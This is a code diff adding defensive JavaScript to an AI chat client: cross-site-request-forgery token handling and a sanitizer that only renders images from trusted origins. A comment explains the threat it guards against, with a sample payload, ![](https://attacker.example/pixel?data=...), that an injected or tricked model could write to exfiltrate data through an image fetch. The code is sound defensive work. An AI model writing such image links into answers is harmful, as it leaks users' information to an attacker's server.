@@ -520,3 +520,330 @@ window.CoreAIChatMarkers = window.CoreAIChatMarkers || (function () {
         citationMarkerHtml: citationMarkerHtml
     };
 })();
+
+/*
+ * The antiforgery token the chat sends with the POSTs it makes (uploading and removing documents).
+ *
+ * Those endpoints validate the token of a request the browser authenticated on its own, which is what cookie
+ * authentication does, so a page on another site cannot make a visitor's browser upload a file as them. The token goes
+ * in the RequestVerificationToken header. It is read from, in order: the chat config's antiforgeryToken, a
+ * <meta name="RequestVerificationToken" content="..."> tag, and the hidden __RequestVerificationToken field a form on
+ * the page carries (Razor writes one with @Html.AntiForgeryToken() or any form tag helper). When there is none, no
+ * header is sent: the request is then an anonymous or bearer-token one, and the server asks for no token.
+ */
+window.CoreAIAntiforgery = window.CoreAIAntiforgery || (function () {
+    'use strict';
+
+    const headerName = 'RequestVerificationToken';
+
+    function readFromPage() {
+        if (typeof document === 'undefined' || !document || typeof document.querySelector !== 'function') {
+            return null;
+        }
+
+        const meta = document.querySelector('meta[name="' + headerName + '"]');
+
+        if (meta && meta.content) {
+            return meta.content;
+        }
+
+        const field = document.querySelector('input[name="__RequestVerificationToken"]');
+
+        return field && field.value ? field.value : null;
+    }
+
+    function findToken(config) {
+        if (config && typeof config.antiforgeryToken === 'string' && config.antiforgeryToken) {
+            return config.antiforgeryToken;
+        }
+
+        return readFromPage();
+    }
+
+    // The token belongs to this site. Sent to another origin it would hand the page's token to a third party, and the
+    // custom header would force a CORS preflight that server may not allow. An address that cannot be resolved is not sent.
+    function isSameOrigin(url) {
+        if (url === undefined || url === null) {
+            return true;
+        }
+
+        try {
+            const base = typeof document !== 'undefined' && document && document.baseURI ? document.baseURI : window.location.href;
+
+            return new URL(url, base).origin === new URL(base).origin;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    // The headers of a fetch to the given address: the ones given, plus the token when there is one and the address is on
+    // this site.
+    function headers(config, extra, url) {
+        const result = Object.assign({}, extra);
+        const token = isSameOrigin(url) ? findToken(config) : null;
+
+        if (token) {
+            result[headerName] = token;
+        }
+
+        return result;
+    }
+
+    // Sets the token on an XMLHttpRequest that has been opened and not yet sent, when its address is on this site.
+    function apply(request, config, url) {
+        const token = isSameOrigin(url) ? findToken(config) : null;
+
+        if (token && request && typeof request.setRequestHeader === 'function') {
+            request.setRequestHeader(headerName, token);
+        }
+    }
+
+    return {
+        headerName: headerName,
+        findToken: findToken,
+        headers: headers,
+        apply: apply
+    };
+})();
+
+/*
+ * Which Markdown images the chat draws.
+ *
+ * A model's answer is rendered as Markdown, and an image in it makes the browser fetch its address without a click.
+ * Text the model was tricked into writing, or read out of a document it was given, can put what it knows in that
+ * address -- ![](https://attacker.example/pixel?data=...) -- and the visitor's browser sends it as soon as the answer
+ * is shown. So an image is only drawn when it comes from the page's own origin, from a host the page lists in
+ * allowedImageHosts, or is a data or blob image, which makes no request. Any other image is shown as a plain link the
+ * visitor has to choose to follow.
+ *
+ * allowedImageHosts is an array of host names: "images.example.com" matches that host, "*.example.com" matches its
+ * subdomains (not the bare domain). Empty or missing means same-origin only. It is a chat config option on both chat
+ * clients, so the host decides which sources it trusts.
+ */
+window.CoreAIImages = window.CoreAIImages || (function () {
+    'use strict';
+
+    const rawImageHook = 'afterSanitizeAttributes';
+    // Elements and attributes that make the browser request an address when they are rendered, with no click: media and
+    // its poster, tracks, SVG and MathML images, table backgrounds. DOMPurify keeps them by default. A form <input> is not listed
+    // because the task-list checkbox has to stay; the hook below keeps checkboxes and removes every other input.
+    // <img> is not listed because an allowed image has to stay; it is handled one by one in the hook below.
+    const fetchingTags = ['style', 'video', 'audio', 'source', 'track', 'svg', 'math'];
+    const fetchingAttributes = ['background', 'poster', 'srcset', 'lowsrc', 'dynsrc'];
+
+    // Declarations made of names, plain values, colons and semicolons: no url(), no function at all, no escape, no quote.
+    const safeStyle = /^[\w\s:;.%#,-]*$/;
+
+    function withFetcherLimits(config) {
+        const limited = Object.assign({}, config);
+
+        limited.FORBID_TAGS = (config && config.FORBID_TAGS ? config.FORBID_TAGS : []).concat(fetchingTags);
+        limited.FORBID_ATTR = (config && config.FORBID_ATTR ? config.FORBID_ATTR : []).concat(fetchingAttributes);
+
+        return limited;
+    }
+
+
+    function escapeHtml(text) {
+        return String(text == null ? '' : text)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    // "https://Images.Example.com/path" and "images.example.com" are the same entry.
+    function normalizeHost(entry) {
+        if (typeof entry !== 'string') {
+            return '';
+        }
+
+        return entry.trim().toLowerCase().replace(/^[a-z][a-z0-9+.-]*:\/\//, '').split(/[/?#]/)[0];
+    }
+
+    function defaultPort(url) {
+        return url.protocol === 'https:' ? '443' : '80';
+    }
+
+    function hostMatches(url, entry) {
+        const host = normalizeHost(entry);
+
+        if (!host) {
+            return false;
+        }
+
+        // An entry with a port names that port, and an address that leaves its port out means the scheme's default one;
+        // an entry without a port matches the host on any port.
+        const separator = host.lastIndexOf(':');
+        const entryPort = separator > 0 ? host.slice(separator + 1) : null;
+        const entryHost = separator > 0 ? host.slice(0, separator) : host;
+        const candidate = url.hostname.toLowerCase();
+
+        if (entryPort !== null && entryPort !== (url.port || defaultPort(url))) {
+            return false;
+        }
+
+        if (entryHost.startsWith('*.')) {
+            return candidate.endsWith(entryHost.slice(1)) && candidate.length > entryHost.length - 1;
+        }
+
+        return candidate === entryHost;
+    }
+
+    function pageAddress(options) {
+        if (options && options.baseUrl) {
+            return options.baseUrl;
+        }
+
+        // Relative addresses resolve against the document's base URL, which a <base> element can move away from the address.
+        if (typeof document !== 'undefined' && document && document.baseURI) {
+            return document.baseURI;
+        }
+
+        return window.location && window.location.href ? window.location.href : null;
+    }
+
+    function isAllowedSource(src, options) {
+        if (typeof src !== 'string') {
+            return false;
+        }
+
+        const address = src.trim();
+
+        if (!address) {
+            return false;
+        }
+
+        // A data image is the picture itself: it cannot ask the network for anything.
+        if (/^data:image\//i.test(address)) {
+            return true;
+        }
+
+        const base = pageAddress(options);
+
+        if (!base) {
+            return false;
+        }
+
+        let url;
+        let page;
+
+        try {
+            url = new URL(address, base);
+            page = new URL(base);
+        } catch (error) {
+            return false;
+        }
+
+        if (url.protocol === 'blob:') {
+            return url.origin === page.origin;
+        }
+
+        if (url.protocol !== 'http:' && url.protocol !== 'https:') {
+            return false;
+        }
+
+        if (url.origin === page.origin) {
+            return true;
+        }
+
+        const hosts = options && Array.isArray(options.allowedHosts) ? options.allowedHosts : [];
+
+        return hosts.some(function (entry) { return hostMatches(url, entry); });
+    }
+
+    // Only an address a visitor can safely follow is linked; anything else is shown as text.
+    function isSafeLinkTarget(href) {
+        return typeof href === 'string' && /^(https?:\/\/|\/(?!\/)|[^:]*$)/i.test(href.trim()) && !/^\s*(javascript|vbscript|data):/i.test(href);
+    }
+
+    // What replaces an image that is not allowed. The address stays visible and one click away, and nothing loads.
+    function linkHtml(href, label) {
+        const text = typeof label === 'string' && label.trim() ? label.trim() : (href || '');
+
+        if (!isSafeLinkTarget(href) || !href) {
+            return escapeHtml(text);
+        }
+
+        return '<a href="' + escapeHtml(href) + '" target="_blank" rel="noopener noreferrer">' + escapeHtml(text) + '</a>';
+    }
+
+    // The same replacement as an element, for an <img> the sanitizer finds in the answer's raw HTML.
+    function linkElement(href, label) {
+        const text = typeof label === 'string' && label.trim() ? label.trim() : (href || '');
+        const linkable = isSafeLinkTarget(href) && !!href;
+        const element = document.createElement(linkable ? 'a' : 'span');
+
+        if (linkable) {
+            element.setAttribute('href', href);
+            element.setAttribute('target', '_blank');
+            element.setAttribute('rel', 'noopener noreferrer');
+        }
+
+        element.textContent = text;
+
+        return element;
+    }
+
+    /*
+     * DOMPurify.sanitize for the HTML of an answer. An <img> the model wrote as raw HTML never goes through the
+     * Markdown image renderer, so the same rule is applied here, while the sanitizer walks the elements. The hook is
+     * registered for this one call only, so it never applies to the other things the page sanitizes.
+     */
+    function sanitize(purify, html, purifyConfig, options) {
+        const hook = function (node) {
+            if (!node || typeof node.tagName !== 'string') {
+                return;
+            }
+
+            // A style can fetch with url(), image-set() and friends, and a CSS escape can spell any of them. Only plain
+            // declarations (such as the size the chat gives its own images) are kept.
+            if (typeof node.getAttribute === 'function' && node.getAttribute('style') !== null && !safeStyle.test(node.getAttribute('style'))) {
+                node.removeAttribute('style');
+            }
+
+            // The only <input> in an answer is the disabled checkbox Markdown writes for a task list. Every other type (an
+            // image button above all) can fetch or submit, so it is removed, and a checkbox keeps nothing that names an address.
+            if (node.tagName.toUpperCase() === 'INPUT') {
+                if ((node.getAttribute('type') || '').toLowerCase() !== 'checkbox') {
+                    node.remove();
+
+                    return;
+                }
+
+                node.removeAttribute('src');
+                node.removeAttribute('formaction');
+                node.removeAttribute('form');
+
+                return;
+            }
+
+            if (node.tagName.toUpperCase() !== 'IMG') {
+                return;
+            }
+
+            node.removeAttribute('srcset');
+
+            const src = node.getAttribute('src');
+
+            if (!isAllowedSource(src, options)) {
+                node.replaceWith(linkElement(src, node.getAttribute('alt')));
+            }
+        };
+
+        purify.addHook(rawImageHook, hook);
+
+        try {
+            return purify.sanitize(html, withFetcherLimits(purifyConfig));
+        } finally {
+            purify.removeHook(rawImageHook, hook);
+        }
+    }
+
+    return {
+        isAllowedSource: isAllowedSource,
+        linkHtml: linkHtml,
+        sanitize: sanitize
+    };
+})();
